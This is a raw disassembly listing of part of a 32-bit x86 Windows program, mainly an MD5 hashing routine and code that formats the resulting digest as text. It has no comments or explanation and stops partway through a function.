  4023fb:	84 c0                	test   %al,%al
  4023fd:	74 47                	je     0x402446
  4023ff:	e8 bc f3 ff ff       	call   0x4017c0
  402404:	50                   	push   %eax
  402405:	e8 b6 29 00 00       	call   0x404dc0
  40240a:	85 c0                	test   %eax,%eax
  40240c:	0f 99 05 a4 eb 40 00 	setns  0x40eba4
  402413:	85 c0                	test   %eax,%eax
  402415:	78 2f                	js     0x402446
  402417:	ff 75 08             	push   0x8(%ebp)
  40241a:	e8 01 0c 00 00       	call   0x403020
  40241f:	84 c0                	test   %al,%al
  402421:	74 23                	je     0x402446
  402423:	68 08 a8 40 00       	push   $0x40a808
  402428:	e8 03 23 00 00       	call   0x404730
  40242d:	68 00 22 40 00       	push   $0x402200
  402432:	68 18 a8 40 00       	push   $0x40a818
  402437:	e8 b4 20 00 00       	call   0x4044f0
  40243c:	84 c0                	test   %al,%al
  40243e:	74 06                	je     0x402446
  402440:	33 c0                	xor    %eax,%eax
  402442:	5d                   	pop    %ebp
  402443:	c2 08 00             	ret    $0x8
  402446:	e8 25 12 00 00       	call   0x403670
  40244b:	e8 80 13 00 00       	call   0x4037d0
  402450:	e8 9b 0b 00 00       	call   0x402ff0
  402455:	e8 a6 33 00 00       	call   0x405800
  40245a:	80 3d a4 eb 40 00 00 	cmpb   $0x0,0x40eba4
  402461:	74 0c                	je     0x40246f
  402463:	e8 38 2d 00 00       	call   0x4051a0
  402468:	c6 05 a4 eb 40 00 00 	movb   $0x0,0x40eba4
  40246f:	e8 2c f0 ff ff       	call   0x4014a0
  402474:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
  402479:	5d                   	pop    %ebp
  40247a:	c2 08 00             	ret    $0x8
  40247d:	cc                   	int3
  40247e:	cc                   	int3
  40247f:	cc                   	int3
  402480:	83 3d 18 a8 40 00 00 	cmpl   $0x0,0x40a818
  402487:	c6 05 04 a8 40 00 01 	movb   $0x1,0x40a804
  40248e:	74 20                	je     0x4024b0
  402490:	68 08 a8 40 00       	push   $0x40a808
  402495:	e8 06 29 00 00       	call   0x404da0
  40249a:	68 e8 03 00 00       	push   $0x3e8
  40249f:	e8 2c 23 00 00       	call   0x4047d0
  4024a4:	a1 18 a8 40 00       	mov    0x40a818,%eax
  4024a9:	50                   	push   %eax
  4024aa:	ff 15 a0 70 40 00    	call   *0x4070a0
  4024b0:	e8 bb 11 00 00       	call   0x403670
  4024b5:	e8 16 13 00 00       	call   0x4037d0
  4024ba:	e8 31 0b 00 00       	call   0x402ff0
  4024bf:	e8 3c 33 00 00       	call   0x405800
  4024c4:	80 3d a4 eb 40 00 00 	cmpb   $0x0,0x40eba4
  4024cb:	74 0c                	je     0x4024d9
  4024cd:	e8 ce 2c 00 00       	call   0x4051a0
  4024d2:	c6 05 a4 eb 40 00 00 	movb   $0x0,0x40eba4
  4024d9:	e8 c2 ef ff ff       	call   0x4014a0
  4024de:	c2 04 00             	ret    $0x4
  4024e1:	cc                   	int3
  4024e2:	cc                   	int3
  4024e3:	cc                   	int3
  4024e4:	cc                   	int3
  4024e5:	cc                   	int3
  4024e6:	cc                   	int3
  4024e7:	cc                   	int3
  4024e8:	cc                   	int3
  4024e9:	cc                   	int3
  4024ea:	cc                   	int3
  4024eb:	cc                   	int3
  4024ec:	cc                   	int3
  4024ed:	cc                   	int3
  4024ee:	cc                   	int3
  4024ef:	cc                   	int3
  4024f0:	55                   	push   %ebp
  4024f1:	8b ec                	mov    %esp,%ebp
  4024f3:	83 ec 74             	sub    $0x74,%esp
  4024f6:	a1 a4 a7 40 00       	mov    0x40a7a4,%eax
  4024fb:	33 c5                	xor    %ebp,%eax
  4024fd:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402500:	8b 45 08             	mov    0x8(%ebp),%eax
  402503:	33 c9                	xor    %ecx,%ecx
  402505:	56                   	push   %esi
  402506:	ff 75 0c             	push   0xc(%ebp)
  402509:	8b 75 10             	mov    0x10(%ebp),%esi
  40250c:	50                   	push   %eax
  40250d:	8d 45 8c             	lea    -0x74(%ebp),%eax
  402510:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  402513:	50                   	push   %eax
  402514:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  402517:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40251a:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  40251d:	89 4d a0             	mov    %ecx,-0x60(%ebp)
  402520:	89 4d 9c             	mov    %ecx,-0x64(%ebp)
  402523:	c7 45 8c 01 23 45 67 	movl   $0x67452301,-0x74(%ebp)
  40252a:	c7 45 90 89 ab cd ef 	movl   $0xefcdab89,-0x70(%ebp)
  402531:	c7 45 94 fe dc ba 98 	movl   $0x98badcfe,-0x6c(%ebp)
  402538:	c7 45 98 76 54 32 10 	movl   $0x10325476,-0x68(%ebp)
  40253f:	e8 5c 08 00 00       	call   0x402da0
  402544:	33 d2                	xor    %edx,%edx
  402546:	8d 4d 9d             	lea    -0x63(%ebp),%ecx
  402549:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  402550:	0f b6 41 ff          	movzbl -0x1(%ecx),%eax
  402554:	8d 49 04             	lea    0x4(%ecx),%ecx
  402557:	88 44 15 e4          	mov    %al,-0x1c(%ebp,%edx,1)
  40255b:	0f b6 41 fc          	movzbl -0x4(%ecx),%eax
  40255f:	88 44 15 e5          	mov    %al,-0x1b(%ebp,%edx,1)
  402563:	0f b6 41 fd          	movzbl -0x3(%ecx),%eax
  402567:	88 44 15 e6          	mov    %al,-0x1a(%ebp,%edx,1)
  40256b:	0f b6 41 fe          	movzbl -0x2(%ecx),%eax
  40256f:	88 44 15 e7          	mov    %al,-0x19(%ebp,%edx,1)
  402573:	83 c2 04             	add    $0x4,%edx
  402576:	83 fa 08             	cmp    $0x8,%edx
  402579:	72 d5                	jb     0x402550
  40257b:	8b 45 9c             	mov    -0x64(%ebp),%eax
  40257e:	b9 38 00 00 00       	mov    $0x38,%ecx
  402583:	c1 e8 03             	shr    $0x3,%eax
  402586:	83 e0 3f             	and    $0x3f,%eax
  402589:	83 f8 38             	cmp    $0x38,%eax
  40258c:	72 05                	jb     0x402593
  40258e:	b9 78 00 00 00       	mov    $0x78,%ecx
  402593:	2b c8                	sub    %eax,%ecx
  402595:	8d 45 8c             	lea    -0x74(%ebp),%eax
  402598:	51                   	push   %ecx
  402599:	68 28 a7 40 00       	push   $0x40a728
  40259e:	50                   	push   %eax
  40259f:	e8 fc 07 00 00       	call   0x402da0
  4025a4:	6a 08                	push   $0x8
  4025a6:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4025a9:	50                   	push   %eax
  4025aa:	8d 45 8c             	lea    -0x74(%ebp),%eax
  4025ad:	50                   	push   %eax
  4025ae:	e8 ed 07 00 00       	call   0x402da0
  4025b3:	33 d2                	xor    %edx,%edx
  4025b5:	8d 45 8d             	lea    -0x73(%ebp),%eax
  4025b8:	eb 06                	jmp    0x4025c0
  4025ba:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  4025c0:	0f b6 48 ff          	movzbl -0x1(%eax),%ecx
  4025c4:	8d 40 04             	lea    0x4(%eax),%eax
  4025c7:	88 4c 15 ec          	mov    %cl,-0x14(%ebp,%edx,1)
  4025cb:	0f b6 48 fc          	movzbl -0x4(%eax),%ecx
  4025cf:	88 4c 15 ed          	mov    %cl,-0x13(%ebp,%edx,1)
  4025d3:	0f b6 48 fd          	movzbl -0x3(%eax),%ecx
  4025d7:	88 4c 15 ee          	mov    %cl,-0x12(%ebp,%edx,1)
  4025db:	0f b6 48 fe          	movzbl -0x2(%eax),%ecx
  4025df:	88 4c 15 ef          	mov    %cl,-0x11(%ebp,%edx,1)
  4025e3:	83 c2 04             	add    $0x4,%edx
  4025e6:	83 fa 10             	cmp    $0x10,%edx
  4025e9:	72 d5                	jb     0x4025c0
  4025eb:	6a 58                	push   $0x58
  4025ed:	8d 45 8c             	lea    -0x74(%ebp),%eax
  4025f0:	6a 00                	push   $0x0
  4025f2:	50                   	push   %eax
  4025f3:	e8 d8 42 00 00       	call   0x4068d0
  4025f8:	0f b6 45 fb          	movzbl -0x5(%ebp),%eax
  4025fc:	50                   	push   %eax
  4025fd:	0f b6 45 fa          	movzbl -0x6(%ebp),%eax
  402601:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  402604:	50                   	push   %eax
  402605:	0f b6 c5             	movzbl %ch,%eax
  402608:	50                   	push   %eax
  402609:	0f b6 c1             	movzbl %cl,%eax
  40260c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40260f:	50                   	push   %eax
  402610:	0f b6 45 f7          	movzbl -0x9(%ebp),%eax
  402614:	50                   	push   %eax
  402615:	0f b6 45 f6          	movzbl -0xa(%ebp),%eax
  402619:	50                   	push   %eax
  40261a:	0f b6 c5             	movzbl %ch,%eax
  40261d:	50                   	push   %eax
  40261e:	0f b6 c1             	movzbl %cl,%eax
  402621:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  402624:	50                   	push   %eax
  402625:	0f b6 45 f3          	movzbl -0xd(%ebp),%eax
  402629:	50                   	push   %eax
  40262a:	0f b6 45 f2          	movzbl -0xe(%ebp),%eax
  40262e:	50                   	push   %eax
  40262f:	0f b6 c5             	movzbl %ch,%eax
  402632:	50                   	push   %eax
  402633:	0f b6 c1             	movzbl %cl,%eax
  402636:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402639:	50                   	push   %eax
  40263a:	0f b6 45 ef          	movzbl -0x11(%ebp),%eax
  40263e:	50                   	push   %eax
  40263f:	0f b6 45 ee          	movzbl -0x12(%ebp),%eax
  402643:	50                   	push   %eax
  402644:	0f b6 c5             	movzbl %ch,%eax
  402647:	50                   	push   %eax
  402648:	0f b6 c1             	movzbl %cl,%eax
  40264b:	50                   	push   %eax
  40264c:	68 3c 6d 40 00       	push   $0x406d3c
  402651:	56                   	push   %esi
  402652:	e8 8c 42 00 00       	call   0x4068e3
  402657:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40265a:	83 c4 54             	add    $0x54,%esp
  40265d:	33 cd                	xor    %ebp,%ecx
  40265f:	5e                   	pop    %esi
  402660:	e8 11 46 00 00       	call   0x406c76
  402665:	8b e5                	mov    %ebp,%esp
  402667:	5d                   	pop    %ebp
  402668:	c2 0c 00             	ret    $0xc
  40266b:	cc                   	int3
  40266c:	cc                   	int3
  40266d:	cc                   	int3
  40266e:	cc                   	int3
  40266f:	cc                   	int3
  402670:	55                   	push   %ebp
  402671:	8b ec                	mov    %esp,%ebp
  402673:	83 ec 68             	sub    $0x68,%esp
  402676:	a1 a4 a7 40 00       	mov    0x40a7a4,%eax
  40267b:	33 c5                	xor    %ebp,%eax
  40267d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402680:	8b 45 08             	mov    0x8(%ebp),%eax
  402683:	53                   	push   %ebx
  402684:	56                   	push   %esi
  402685:	89 45 9c             	mov    %eax,-0x64(%ebp)
  402688:	8b 70 08             	mov    0x8(%eax),%esi
  40268b:	8b 08                	mov    (%eax),%ecx
  40268d:	8b 58 04             	mov    0x4(%eax),%ebx
  402690:	8b 40 0c             	mov    0xc(%eax),%eax
  402693:	89 45 a4             	mov    %eax,-0x5c(%ebp)
  402696:	8b 45 0c             	mov    0xc(%ebp),%eax
  402699:	57                   	push   %edi
  40269a:	89 75 a8             	mov    %esi,-0x58(%ebp)
  40269d:	83 c0 02             	add    $0x2,%eax
  4026a0:	89 4d ac             	mov    %ecx,-0x54(%ebp)
  4026a3:	8d 75 bc             	lea    -0x44(%ebp),%esi
  4026a6:	89 5d 98             	mov    %ebx,-0x68(%ebp)
  4026a9:	bf 10 00 00 00       	mov    $0x10,%edi
  4026ae:	8b ff                	mov    %edi,%edi
  4026b0:	0f b6 50 01          	movzbl 0x1(%eax),%edx
  4026b4:	8d 76 04             	lea    0x4(%esi),%esi
  4026b7:	0f b6 08             	movzbl (%eax),%ecx
  4026ba:	8d 40 04             	lea    0x4(%eax),%eax
  4026bd:	c1 e2 08             	shl    $0x8,%edx
  4026c0:	0b d1                	or     %ecx,%edx
  4026c2:	0f b6 48 fb          	movzbl -0x5(%eax),%ecx
  4026c6:	c1 e2 08             	shl    $0x8,%edx
  4026c9:	0b d1                	or     %ecx,%edx
  4026cb:	0f b6 48 fa          	movzbl -0x6(%eax),%ecx
  4026cf:	c1 e2 08             	shl    $0x8,%edx
  4026d2:	0b d1                	or     %ecx,%edx
  4026d4:	89 56 fc             	mov    %edx,-0x4(%esi)
  4026d7:	83 ef 01             	sub    $0x1,%edi
  4026da:	75 d4                	jne    0x4026b0
  4026dc:	8b 7d a8             	mov    -0x58(%ebp),%edi
  4026df:	8b cb                	mov    %ebx,%ecx
  4026e1:	f7 d1                	not    %ecx
  4026e3:	8b 75 a4             	mov    -0x5c(%ebp),%esi
  4026e6:	23 ce                	and    %esi,%ecx
  4026e8:	8b 55 ac             	mov    -0x54(%ebp),%edx
  4026eb:	8b c7                	mov    %edi,%eax
  4026ed:	81 c2 78 a4 6a d7    	add    $0xd76aa478,%edx
  4026f3:	23 c3                	and    %ebx,%eax
  4026f5:	81 c6 56 b7 c7 e8    	add    $0xe8c7b756,%esi
  4026fb:	0b c8                	or     %eax,%ecx
  4026fd:	8b c3                	mov    %ebx,%eax
  4026ff:	03 4d bc             	add    -0x44(%ebp),%ecx
  402702:	03 d1                	add    %ecx,%edx
  402704:	c1 c2 07             	rol    $0x7,%edx
  402707:	03 d3                	add    %ebx,%edx
  402709:	23 c2                	and    %edx,%eax
  40270b:	8b ca                	mov    %edx,%ecx
  40270d:	f7 d1                	not    %ecx
  40270f:	23 cf                	and    %edi,%ecx
  402711:	81 c7 db 70 20 24    	add    $0x242070db,%edi
  402717:	0b c8                	or     %eax,%ecx
  402719:	03 4d c0             	add    -0x40(%ebp),%ecx
  40271c:	03 f1                	add    %ecx,%esi
  40271e:	c1 c6 0c             	rol    $0xc,%esi
  402721:	03 f2                	add    %edx,%esi
  402723:	8b ce                	mov    %esi,%ecx
  402725:	8b c6                	mov    %esi,%eax
  402727:	f7 d1                	not    %ecx
  402729:	23 c2                	and    %edx,%eax
  40272b:	23 cb                	and    %ebx,%ecx
  40272d:	81 c3 ee ce bd c1    	add    $0xc1bdceee,%ebx
  402733:	0b c8                	or     %eax,%ecx
  402735:	8b c6                	mov    %esi,%eax
  402737:	03 4d c4             	add    -0x3c(%ebp),%ecx
  40273a:	03 f9                	add    %ecx,%edi
  40273c:	c1 cf 0f             	ror    $0xf,%edi
  40273f:	03 fe                	add    %esi,%edi
  402741:	23 c7                	and    %edi,%eax
  402743:	8b cf                	mov    %edi,%ecx
  402745:	f7 d1                	not    %ecx
  402747:	23 ca                	and    %edx,%ecx
  402749:	0b c8                	or     %eax,%ecx
  40274b:	8b c7                	mov    %edi,%eax
  40274d:	03 4d c8             	add    -0x38(%ebp),%ecx
  402750:	03 d9                	add    %ecx,%ebx
  402752:	c1 cb 0a             	ror    $0xa,%ebx
  402755:	03 df                	add    %edi,%ebx
  402757:	23 c3                	and    %ebx,%eax
  402759:	8b cb                	mov    %ebx,%ecx
  40275b:	f7 d1                	not    %ecx
  40275d:	23 ce                	and    %esi,%ecx
  40275f:	0b c8                	or     %eax,%ecx
  402761:	8b c3                	mov    %ebx,%eax
  402763:	81 c1 af 0f 7c f5    	add    $0xf57c0faf,%ecx
  402769:	03 4d cc             	add    -0x34(%ebp),%ecx
  40276c:	03 d1                	add    %ecx,%edx
  40276e:	c1 c2 07             	rol    $0x7,%edx
  402771:	03 d3                	add    %ebx,%edx
  402773:	8b ca                	mov    %edx,%ecx
  402775:	23 c2                	and    %edx,%eax
  402777:	f7 d1                	not    %ecx
  402779:	23 cf                	and    %edi,%ecx
  40277b:	0b c8                	or     %eax,%ecx
  40277d:	81 c1 2a c6 87 47    	add    $0x4787c62a,%ecx
  402783:	03 4d d0             	add    -0x30(%ebp),%ecx
  402786:	03 f1                	add    %ecx,%esi
  402788:	c1 c6 0c             	rol    $0xc,%esi
  40278b:	03 f2                	add    %edx,%esi
  40278d:	8b ce                	mov    %esi,%ecx
  40278f:	8b c6                	mov    %esi,%eax
  402791:	f7 d1                	not    %ecx
  402793:	23 c2                	and    %edx,%eax
  402795:	23 cb                	and    %ebx,%ecx
  402797:	0b c8                	or     %eax,%ecx
  402799:	81 c1 13 46 30 a8    	add    $0xa8304613,%ecx
  40279f:	03 4d d4             	add    -0x2c(%ebp),%ecx
  4027a2:	03 f9                	add    %ecx,%edi
  4027a4:	c1 cf 0f             	ror    $0xf,%edi
  4027a7:	03 fe                	add    %esi,%edi
  4027a9:	8b cf                	mov    %edi,%ecx
  4027ab:	f7 d1                	not    %ecx
  4027ad:	8b c6                	mov    %esi,%eax
  4027af:	23 ca                	and    %edx,%ecx
  4027b1:	23 c7                	and    %edi,%eax
  4027b3:	0b c8                	or     %eax,%ecx
  4027b5:	8b c7                	mov    %edi,%eax
  4027b7:	81 c1 01 95 46 fd    	add    $0xfd469501,%ecx
  4027bd:	03 4d d8             	add    -0x28(%ebp),%ecx
  4027c0:	03 d9                	add    %ecx,%ebx
  4027c2:	c1 cb 0a             	ror    $0xa,%ebx
  4027c5:	03 df                	add    %edi,%ebx
  4027c7:	23 c3                	and    %ebx,%eax
  4027c9:	8b cb                	mov    %ebx,%ecx
  4027cb:	f7 d1                	not    %ecx
  4027cd:	23 ce                	and    %esi,%ecx
  4027cf:	0b c8                	or     %eax,%ecx
  4027d1:	8b c3                	mov    %ebx,%eax
  4027d3:	81 c1 d8 98 80 69    	add    $0x698098d8,%ecx
  4027d9:	03 4d dc             	add    -0x24(%ebp),%ecx
  4027dc:	03 d1                	add    %ecx,%edx
  4027de:	c1 c2 07             	rol    $0x7,%edx
  4027e1:	03 d3                	add    %ebx,%edx
  4027e3:	23 c2                	and    %edx,%eax
  4027e5:	8b ca                	mov    %edx,%ecx
  4027e7:	f7 d1                	not    %ecx
  4027e9:	23 cf                	and    %edi,%ecx
  4027eb:	0b c8                	or     %eax,%ecx
  4027ed:	81 c1 af f7 44 8b    	add    $0x8b44f7af,%ecx
  4027f3:	03 4d e0             	add    -0x20(%ebp),%ecx
  4027f6:	03 f1                	add    %ecx,%esi
  4027f8:	c1 c6 0c             	rol    $0xc,%esi
  4027fb:	03 f2                	add    %edx,%esi
  4027fd:	8b ce                	mov    %esi,%ecx
  4027ff:	8b c6                	mov    %esi,%eax
  402801:	f7 d1                	not    %ecx
  402803:	23 c2                	and    %edx,%eax
  402805:	23 cb                	and    %ebx,%ecx
  402807:	0b c8                	or     %eax,%ecx
  402809:	8b c6                	mov    %esi,%eax
  40280b:	81 c1 b1 5b ff ff    	add    $0xffff5bb1,%ecx
  402811:	03 4d e4             	add    -0x1c(%ebp),%ecx
  402814:	03 f9                	add    %ecx,%edi
  402816:	c1 cf 0f             	ror    $0xf,%edi
  402819:	03 fe                	add    %esi,%edi
  40281b:	8b cf                	mov    %edi,%ecx
  40281d:	89 7d a0             	mov    %edi,-0x60(%ebp)
  402820:	f7 d1                	not    %ecx
  402822:	23 c7                	and    %edi,%eax
  402824:	23 ca                	and    %edx,%ecx
  402826:	0b c8                	or     %eax,%ecx
  402828:	8b c7                	mov    %edi,%eax
  40282a:	81 c1 be d7 5c 89    	add    $0x895cd7be,%ecx
  402830:	03 4d e8             	add    -0x18(%ebp),%ecx
  402833:	03 d9                	add    %ecx,%ebx
  402835:	c1 cb 0a             	ror    $0xa,%ebx
  402838:	03 df                	add    %edi,%ebx
  40283a:	8b cb                	mov    %ebx,%ecx
  40283c:	89 5d b4             	mov    %ebx,-0x4c(%ebp)
  40283f:	f7 d1                	not    %ecx
  402841:	23 c3                	and    %ebx,%eax
  402843:	23 ce                	and    %esi,%ecx
  402845:	0b c8                	or     %eax,%ecx
  402847:	8b c3                	mov    %ebx,%eax
  402849:	81 c1 22 11 90 6b    	add    $0x6b901122,%ecx
  40284f:	03 4d ec             	add    -0x14(%ebp),%ecx
  402852:	03 d1                	add    %ecx,%edx
  402854:	c1 c2 07             	rol    $0x7,%edx
  402857:	03 d3                	add    %ebx,%edx
  402859:	8b ca                	mov    %edx,%ecx
  40285b:	89 55 b0             	mov    %edx,-0x50(%ebp)
  40285e:	f7 d1                	not    %ecx
  402860:	23 c2                	and    %edx,%eax
  402862:	23 cf                	and    %edi,%ecx
  402864:	8d be 93 71 98 fd    	lea    -0x2678e6d(%esi),%edi
  40286a:	0b c8                	or     %eax,%ecx
  40286c:	03 4d f0             	add    -0x10(%ebp),%ecx
  40286f:	03 f9                	add    %ecx,%edi
  402871:	c1 c7 0c             	rol    $0xc,%edi
  402874:	03 fa                	add    %edx,%edi
  402876:	89 7d b8             	mov    %edi,-0x48(%ebp)
  402879:	8b f7                	mov    %edi,%esi
  40287b:	f7 d6                	not    %esi
  40287d:	8b c7                	mov    %edi,%eax
  40287f:	23 c2                	and    %edx,%eax
  402881:	8b ce                	mov    %esi,%ecx
  402883:	23 cb                	and    %ebx,%ecx
  402885:	8b 5d a0             	mov    -0x60(%ebp),%ebx
  402888:	0b c8                	or     %eax,%ecx
  40288a:	81 c3 8e 43 79 a6    	add    $0xa679438e,%ebx
  402890:	03 4d f4             	add    -0xc(%ebp),%ecx
  402893:	8b c7                	mov    %edi,%eax
  402895:	03 d9                	add    %ecx,%ebx
  402897:	c1 cb 0f             	ror    $0xf,%ebx
  40289a:	03 df                	add    %edi,%ebx
  40289c:	8b 7d b4             	mov    -0x4c(%ebp),%edi
  40289f:	23 c3                	and    %ebx,%eax
  4028a1:	8b d3                	mov    %ebx,%edx
  4028a3:	f7 d2                	not    %edx
  4028a5:	81 c7 21 08 b4 49    	add    $0x49b40821,%edi
  4028ab:	8b ca                	mov    %edx,%ecx
  4028ad:	23 f3                	and    %ebx,%esi
  4028af:	23 4d b0             	and    -0x50(%ebp),%ecx
  4028b2:	0b c8                	or     %eax,%ecx
  4028b4:	03 4d f8             	add    -0x8(%ebp),%ecx
  4028b7:	03 f9                	add    %ecx,%edi
  4028b9:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  4028bc:	8b c1                	mov    %ecx,%eax
  4028be:	c1 cf 0a             	ror    $0xa,%edi
  4028c1:	03 fb                	add    %ebx,%edi
  4028c3:	81 c1 40 b3 40 c0    	add    $0xc040b340,%ecx
  4028c9:	23 c7                	and    %edi,%eax
  4028cb:	23 d7                	and    %edi,%edx
  4028cd:	0b f0                	or     %eax,%esi
  4028cf:	8b 45 b0             	mov    -0x50(%ebp),%eax
  4028d2:	03 75 c0             	add    -0x40(%ebp),%esi
  4028d5:	05 62 25 1e f6       	add    $0xf61e2562,%eax
  4028da:	03 f0                	add    %eax,%esi
  4028dc:	8b c3                	mov    %ebx,%eax
  4028de:	c1 c6 05             	rol    $0x5,%esi
  4028e1:	03 f7                	add    %edi,%esi
  4028e3:	23 c6                	and    %esi,%eax
  4028e5:	0b d0                	or     %eax,%edx
  4028e7:	03 55 d4             	add    -0x2c(%ebp),%edx
  4028ea:	03 d1                	add    %ecx,%edx
  4028ec:	8b cf                	mov    %edi,%ecx
  4028ee:	f7 d1                	not    %ecx
  4028f0:	c1 c2 09             	rol    $0x9,%edx
  4028f3:	23 ce                	and    %esi,%ecx
  4028f5:	03 d6                	add    %esi,%edx
  4028f7:	8b c2                	mov    %edx,%eax
  4028f9:	23 c7                	and    %edi,%eax
  4028fb:	0b c8                	or     %eax,%ecx
  4028fd:	81 c1 51 5a 5e 26    	add    $0x265e5a51,%ecx
  402903:	03 4d e8             	add    -0x18(%ebp),%ecx
  402906:	03 d9                	add    %ecx,%ebx
  402908:	8b ce                	mov    %esi,%ecx
  40290a:	f7 d1                	not    %ecx
  40290c:	c1 c3 0e             	rol    $0xe,%ebx
  40290f:	23 ca                	and    %edx,%ecx
  402911:	03 da                	add    %edx,%ebx
  402913:	8b c3                	mov    %ebx,%eax
  402915:	23 c6                	and    %esi,%eax
  402917:	0b c8                	or     %eax,%ecx
  402919:	8b c2                	mov    %edx,%eax
  40291b:	81 c1 aa c7 b6 e9    	add    $0xe9b6c7aa,%ecx
  402921:	03 4d bc             	add    -0x44(%ebp),%ecx
  402924:	03 f9                	add    %ecx,%edi
  402926:	8b ca                	mov    %edx,%ecx
  402928:	f7 d1                	not    %ecx
  40292a:	c1 cf 0c             	ror    $0xc,%edi
  40292d:	23 cb                	and    %ebx,%ecx
  40292f:	03 fb                	add    %ebx,%edi
  402931:	23 c7                	and    %edi,%eax
  402933:	0b c8                	or     %eax,%ecx
  402935:	81 c1 5d 10 2f d6    	add    $0xd62f105d,%ecx
  40293b:	03 4d d0             	add    -0x30(%ebp),%ecx
  40293e:	03 f1                	add    %ecx,%esi
  402940:	8b cb                	mov    %ebx,%ecx
  402942:	c1 c6 05             	rol    $0x5,%esi
  402945:	f7 d1                	not    %ecx
  402947:	03 f7                	add    %edi,%esi
  402949:	23 cf                	and    %edi,%ecx
  40294b:	8b c3                	mov    %ebx,%eax
  40294d:	23 c6                	and    %esi,%eax
  40294f:	0b c8                	or     %eax,%ecx
  402951:	81 c1 53 14 44 02    	add    $0x2441453,%ecx
  402957:	03 4d e4             	add    -0x1c(%ebp),%ecx
  40295a:	03 d1                	add    %ecx,%edx
  40295c:	8b cf                	mov    %edi,%ecx
  40295e:	f7 d1                	not    %ecx
  402960:	c1 c2 09             	rol    $0x9,%edx
  402963:	23 ce                	and    %esi,%ecx
  402965:	03 d6                	add    %esi,%edx
  402967:	8b c2                	mov    %edx,%eax
  402969:	23 c7                	and    %edi,%eax
  40296b:	0b c8                	or     %eax,%ecx
  40296d:	81 c1 81 e6 a1 d8    	add    $0xd8a1e681,%ecx
  402973:	03 4d f8             	add    -0x8(%ebp),%ecx
  402976:	03 d9                	add    %ecx,%ebx
  402978:	8b ce                	mov    %esi,%ecx
  40297a:	f7 d1                	not    %ecx
  40297c:	c1 c3 0e             	rol    $0xe,%ebx
  40297f:	23 ca                	and    %edx,%ecx
  402981:	03 da                	add    %edx,%ebx
  402983:	8b c3                	mov    %ebx,%eax
  402985:	23 c6                	and    %esi,%eax
  402987:	0b c8                	or     %eax,%ecx
  402989:	8b c2                	mov    %edx,%eax
  40298b:	81 c1 c8 fb d3 e7    	add    $0xe7d3fbc8,%ecx
  402991:	03 4d cc             	add    -0x34(%ebp),%ecx
  402994:	03 f9                	add    %ecx,%edi
  402996:	8b ca                	mov    %edx,%ecx
  402998:	f7 d1                	not    %ecx
  40299a:	c1 cf 0c             	ror    $0xc,%edi
  40299d:	23 cb                	and    %ebx,%ecx
  40299f:	03 fb                	add    %ebx,%edi
  4029a1:	23 c7                	and    %edi,%eax
  4029a3:	0b c8                	or     %eax,%ecx
  4029a5:	8b c3                	mov    %ebx,%eax
  4029a7:	81 c1 e6 cd e1 21    	add    $0x21e1cde6,%ecx
  4029ad:	03 4d e0             	add    -0x20(%ebp),%ecx
  4029b0:	03 f1                	add    %ecx,%esi
  4029b2:	8b cb                	mov    %ebx,%ecx
  4029b4:	f7 d1                	not    %ecx
  4029b6:	c1 c6 05             	rol    $0x5,%esi
  4029b9:	23 cf                	and    %edi,%ecx
  4029bb:	03 f7                	add    %edi,%esi
  4029bd:	23 c6                	and    %esi,%eax
  4029bf:	0b c8                	or     %eax,%ecx
  4029c1:	81 c1 d6 07 37 c3    	add    $0xc33707d6,%ecx
  4029c7:	03 4d f4             	add    -0xc(%ebp),%ecx
  4029ca:	03 d1                	add    %ecx,%edx
  4029cc:	8b cf                	mov    %edi,%ecx
  4029ce:	f7 d1                	not    %ecx
  4029d0:	c1 c2 09             	rol    $0x9,%edx
  4029d3:	23 ce                	and    %esi,%ecx
  4029d5:	03 d6                	add    %esi,%edx
  4029d7:	8b c2                	mov    %edx,%eax
  4029d9:	89 55 b8             	mov    %edx,-0x48(%ebp)
  4029dc:	23 c7                	and    %edi,%eax
  4029de:	0b c8                	or     %eax,%ecx
  4029e0:	81 c1 87 0d d5 f4    	add    $0xf4d50d87,%ecx
  4029e6:	03 4d c8             	add    -0x38(%ebp),%ecx
  4029e9:	03 d9                	add    %ecx,%ebx
  4029eb:	8b ce                	mov    %esi,%ecx
  4029ed:	f7 d1                	not    %ecx
  4029ef:	c1 c3 0e             	rol    $0xe,%ebx
  4029f2:	03 da                	add    %edx,%ebx
  4029f4:	23 ca                	and    %edx,%ecx
  4029f6:	8b c3                	mov    %ebx,%eax
  4029f8:	23 c6                	and    %esi,%eax
  4029fa:	0b c8                	or     %eax,%ecx
  4029fc:	8b c2                	mov    %edx,%eax
  4029fe:	81 c1 ed 14 5a 45    	add    $0x455a14ed,%ecx
  402a04:	03 4d dc             	add    -0x24(%ebp),%ecx
  402a07:	03 f9                	add    %ecx,%edi
  402a09:	8b ca                	mov    %edx,%ecx
  402a0b:	c1 cf 0c             	ror    $0xc,%edi
  402a0e:	f7 d1                	not    %ecx
  402a10:	03 fb                	add    %ebx,%edi
  402a12:	23 cb                	and    %ebx,%ecx
  402a14:	89 7d b4             	mov    %edi,-0x4c(%ebp)
  402a17:	23 c7                	and    %edi,%eax
  402a19:	0b c8                	or     %eax,%ecx
  402a1b:	8d 96 05 e9 e3 a9    	lea    -0x561c16fb(%esi),%edx
  402a21:	03 4d f0             	add    -0x10(%ebp),%ecx
  402a24:	8b c3                	mov    %ebx,%eax
  402a26:	03 d1                	add    %ecx,%edx
  402a28:	8b 75 b8             	mov    -0x48(%ebp),%esi
  402a2b:	8b cb                	mov    %ebx,%ecx
  402a2d:	c1 c2 05             	rol    $0x5,%edx
  402a30:	03 d7                	add    %edi,%edx
  402a32:	f7 d1                	not    %ecx
  402a34:	23 c2                	and    %edx,%eax
  402a36:	23 cf                	and    %edi,%ecx
  402a38:	0b c8                	or     %eax,%ecx
